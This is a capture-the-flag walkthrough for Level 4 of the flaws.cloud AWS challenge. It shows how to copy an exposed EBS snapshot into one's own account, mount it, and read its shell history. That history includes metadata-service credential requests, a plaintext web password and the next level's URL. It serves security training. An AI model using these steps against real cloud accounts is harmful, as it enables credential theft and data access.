# Level 4

<img width="743" height="836" alt="image" src="https://github.com/user-attachments/assets/073a862c-bf0c-4240-b3e6-89d9c63917b7" />

We will first visit the link and be met with an auth challenge.

<img width="504" height="330" alt="image" src="https://github.com/user-attachments/assets/026b9e4c-dde3-4a8e-950a-b3a56ba9b035" />

```
dig 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud

; <<>> DiG 9.20.11-4+b1-Debian <<>> 4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 52897
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. IN A

;; ANSWER SECTION:
4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud. 289 IN CNAME ec2-54-202-228-246.us-west-2.compute.amazonaws.com.
ec2-54-202-228-246.us-west-2.compute.amazonaws.com. 86389 IN A 54.202.228.246

;; Query time: 8 msec
;; SERVER: 10.0.2.3#53(10.0.2.3) (UDP)
;; WHEN: Sat Jun 20 15:29:30 EDT 2026
;; MSG SIZE  rcvd: 161
```

```
aws ec2 describe-images --region us-west-2
```
<img width="859" height="881" alt="image" src="https://github.com/user-attachments/assets/b55f8b8a-425c-4e42-ab73-01eb1431c9b3" />


```
aws ec2 describe-snapshots --owner self
{
    "Snapshots": [
        {
            "Tags": [
                {
                    "Key": "Name",
                    "Value": "flaws backup 2017.02.27"
                }
            ],
            "StorageTier": "standard",
            "TransferType": "standard",
            "CompletionTime": "2017-02-28T01:37:07+00:00",
            "FullSnapshotSizeInBytes": 2485649408,
            "SnapshotId": "snap-0b49342abd1bdcb89",
            "VolumeId": "vol-04f1c039bc13ea950",
            "State": "completed",
            "StartTime": "2017-02-28T01:35:12+00:00",
            "Progress": "100%",
            "OwnerId": "975426262029",
            "Description": "",
            "VolumeSize": 8,
            "Encrypted": false
        }
    ]
}
```

The compromised backup user can see an EBS snapshot owned by the target account. Since it's not encrypted and you have permission to describe it, you can create a volume from it inside your own AWS account and inspect the filesystem.

```
aws sts get-caller-identity
{
    "UserId": "AIDAJQ3H5DC3LEG2BKSLC",
    "Account": "975426262029",
    "Arn": "arn:aws:iam::975426262029:user/backup"
}
```

```
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_DEFAULT_REGION
```

```
aws --profile flaws sts get-caller-identity
```

<img width="1916" height="620" alt="image" src="https://github.com/user-attachments/assets/148d62e3-358e-4c28-a42b-2e508dcbda7c" />

<img width="1911" height="484" alt="image" src="https://github.com/user-attachments/assets/d6a828e5-b1d9-4a7a-906c-49f5b027c014" />

<img width="1903" height="827" alt="image" src="https://github.com/user-attachments/assets/bd0ba6b8-d031-4aaf-95de-661938099488" />

EC2 → Instances → Launch Instances -> make instance

<img width="711" height="76" alt="image" src="https://github.com/user-attachments/assets/185a4136-fed8-4346-b3f2-c881005166f3" />

<img width="1659" height="573" alt="image" src="https://github.com/user-attachments/assets/84b3b558-7457-41fa-8fad-17a768b8714f" />

<img width="1721" height="551" alt="image" src="https://github.com/user-attachments/assets/8b3d483a-dcd6-4c71-ae66-2427bce14851" />

<img width="682" height="284" alt="image" src="https://github.com/user-attachments/assets/656cfd31-9b34-4e6e-87ec-67dbeb0c9fca" />

After creating a volume from the exposed EBS snapshot, I attached it to my EC2 instance and connected using EC2 Instance Connect.

I first verified that the new disk was attached:

```
lsblk

NAME          MAJ:MIN RM SIZE RO TYPE MOUNTPOINTS
nvme0n1       259:0    0   8G  0 disk 
├─nvme0n1p1   259:1    0   8G  0 part /
├─nvme0n1p127 259:2    0   1M  0 part 
└─nvme0n1p128 259:3    0  10M  0 part /boot/efi
nvme1n1       259:4    0   8G  0 disk 
└─nvme1n1p1   259:5    0   8G  0 part
```

The root disk of the EC2 instance is nvme0n1, while the attached snapshot volume appears as nvme1n1.

I created a mount point and mounted the partition:

```
sudo mkdir /mnt/flaws

sudo mount /dev/nvme1n1p1 /mnt/flaws
```

To simplify further investigation, I switched to the root user:

```
sudo su
```
Finally, I began enumerating the recovered filesystem:

```
sudo ls -lah /mnt/flaws
sudo find /mnt/flaws -maxdepth 2 -type d
sudo ls -lah /mnt/flaws/root
```

This revealed several interesting artifacts, including shell history files, SSH directories, and configuration scripts that could contain credentials or other sensitive information.

```
.bash_history
.ssh/
meta-data
setupNginx.sh
```

The presence of .bash_history suggested that previous administrative commands may reveal sensitive information or operational mistakes.

```
sudo cat /mnt/flaws/root/.bash_history
```

Whole output:

```
[root@ip-172-31-32-129 flaws]# sudo cat /mnt/flaws/home/ubuntu/.bash_history
sudo cat /mnt/flaws/root/.bash_history
sudo apt-get install nginx
sudo apt-get install apache2-utils
htpasswd -c /etc/nginx/.htpasswd flaws
sudo htpasswd -c /etc/nginx/.htpasswd flaws
sudo vim /etc/nginx/sites-enabled/default
vim  /var/www/html/index.html
sudo vim  /var/www/html/index.html
sudo service nginx restart
cat ~/.bash_history
man htpasswd
sudo htpasswd -p /etc/nginx/.htpasswd flaws
sudo /etc/nginx/.htpasswd
sudo su -
pwd
ls -al
sudo chown ubuntu:ubuntu setupNginx.sh 
ls -al
find . -mtime -1
find / -mtime -1
find / -mtime -1 | grep -v var
find / -mtime -1 | grep -v var | grep -v proc | less
find / -mtime -1 | grep -v var | grep -v proc | grep -v dev
find / -mtime -1 | grep -v var | grep -v proc | grep -v dev | less
find / -mtime -1 | grep -v var | grep -v proc | grep -v dev | grep -v sys | less
find / -mtime -1 | grep -v var | grep -v proc | grep -v dev | grep -v sys | grep -v run | less
find / -mtime -1 2&>/dev/null | grep -v var | grep -v proc | grep -v dev | grep -v sys | grep -v run | less
find / -mtime -1 2&>/dev/null
find / -mtime -1 
find / -mtime -1 2>/dev/null
find / -mtime -1 2>/dev/null | grep -v var | grep -v proc | grep -v dev | grep -v sys | grep -v run | less
find / -mtime -1 2>/dev/null | grep -v "^/var" | grep -v proc | grep -v dev | grep -v sys | grep -v run | less
find / -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" 
find / -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" | wc
find / -type f -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" | wc
find / -type f -mtime -1 2>/dev/null | grep -v "/var/" | grep -v "/proc/" | grep -v "/dev/" | grep -v "/sys/" | grep -v "/run/" | less
pwd
cat setupNginx.sh 
curl 169.254.169.254
curl  http://169.254.169.254/latest/meta-data
wget  http://169.254.169.254/latest/meta-data
cat meta-data 
curl -XGET http://169.254.169.254/latest/meta-data
wget  http://169.254.169.254/latest/meta-data/iam
cat iam 
wget  http://169.254.169.254/latest/meta-data/iam/info
cat info 
rm info iam 
ls
cat meta-data 
curl  http://169.254.169.254/latest/meta-data/iam/info
curl  http://169.254.169.254/latest/meta-data/
curl  http://169.254.169.254/latest/meta-data/profile/
curl  http://169.254.169.254/latest/meta-data/profile
curl  http://169.254.169.254/latest/user-data
curl  http://169.254.169.254/iam/security-credentials/flaws
curl  http://169.254.169.254/iam/security-credentials
curl  http://169.254.169.254/iam/security-credentials/flaws/
curl  http://169.254.169.254/iam/
wget http://169.254.169.254/iam/security-credentials/flaws
curl  http://169.254.169.254/meta-data/iam/security-credentials/flaws
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials/flaws
curl  http://169.254.169.254/latest/meta-data/iam/security-credentials
sudo su -
su -
sudo su-
sudo su -
sudo su -
cd /var/www/html/
ls
vim index.html 
cat index.html 
vim index.html 
sudo vim index.html 
cd /var/www/html/
ls
cat index.html 
cat hint.txt 
cat hint2.txt 
cat hint3.txt 
ls
rm hint*
sudo rm hint* -f
ls
cd /etc/nginx/
ls-al
ls -al
cat .htpasswd 
htpasswd -p /etc/nginx/.htpasswd flaws
service nginx restart
cat .htpasswd 
man htpasswd
vim sites-enabled/default 
echo dog | htpasswd -p /etc/nginx/.htpasswd -b flaws
htpasswd -p /etc/nginx/.htpasswd -b flaws dpg
htpasswd -b -p /etc/nginx/.htpasswd flaws dpg
htpasswd -b /etc/nginx/.htpasswd flaws nCP8xigdjpjyiXgJ7nJu7rw5Ro68iE8M
cat .htpasswd 
service nginx restart
vim ~/setupNginx.sh
cd ~
mv setupNginx.sh ~ubuntu/.
exit
nginx -s reload
cd /etc/nginx/
ls
cd conf.d/
ls
cd ../sites-enabled/
ls
vim default 
service nginx restart
nginx -s reload
vim default 
nginx -s reload
service nginx start
curl 
curl 169.254.169.254
vim default 
service nginx stop
service nginx start
service nginx status
service nginx start
nginx 
ps -ef | grep nginx
service nginx stop
kill 27975 -9
ps -ef | grep nginx
nginx
vim default 
nginx -s reload
vim default 
cat default 
vim default 
vim ../nginx.conf 
vim default 
vim /var/www/html/index.html
vim /var/www/html/robots.txt
service nginx restart
tail -f /var/log/nginx/access.log
service nginx stop
nginx 
service nginx stop
/usr/bin/nginx -c /etc/nginx/nginx.conf 
which nginx
/usr/sbin/nginx -c /etc/nginx/nginx.conf 
tail -f /var/log/nginx/error.log
tail -f /var/log/nginx/access.log
python -m SimpleHTTPServer 8000
apt-get install python
python -m SimpleHTTPServer 8000
cd /var/www/
ls
cd html/
ls
rm index.nginx-debian.html 
ls
vim index.html 
vim hint.txt
vim hint2.txt
vim hint3.txt
vim hint4.txt
```
These commands indicated that the instance had an IAM role named flaws attached and that its temporary credentials had been accessed through the metadata service, which ultimately provides the path to the next stage of the challenge.

```
cat /mnt/flaws/var/www/html/index.html
<html>
    <head>
        <title>flAWS</title>
        <META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
        <style>
            body { font-family: Andale Mono, monospace; }
        </style>
    </head>
<body 
  text="#00d000" 
  bgcolor="#000000"  
  style="max-width:800px; margin-left:auto ;margin-right:auto"
  vlink="#00ff00" link="#00ff00">
<center>
<pre>
 _____  _       ____  __    __  _____
|     || |     /    ||  |__|  |/ ___/
|   __|| |    |  o  ||  |  |  (   \_ 
|  |_  | |___ |     ||  |  |  |\__  |
|   _] |     ||  _  ||  `  '  |/  \ |
|  |   |     ||  |  | \      / \    |
|__|   |_____||__|__|  \_/\_/   \___|
</pre>
<h1>flAWS - Level 5</h1>
</center>


Good work getting in.  This level is described at <a href="http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/">http://level5-d2891f604d2061b6977c2481b0c8333e.flaws.cloud/243f422c/</a>
```









